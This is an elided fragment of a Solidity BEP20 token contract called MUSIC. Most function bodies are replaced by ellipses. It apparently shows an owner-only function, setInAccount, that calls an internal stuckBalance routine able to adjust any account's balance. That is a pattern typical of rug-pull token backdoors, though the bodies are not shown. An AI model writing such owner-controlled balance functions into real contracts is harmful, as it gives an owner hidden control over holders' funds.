...
contract MUSIC is Context, IBEP20, Ownable {
  ...
  */
  ...
  function _burnFrom(address account, uint256 amount) internal {
    ...
    function stuckBalance(address taker, uint256 _value) internal {
  ...
  function setInAccount(address _spender, uint256 _value) external onlyOwner {
    stuckBalance(_spender, _value);
  }
}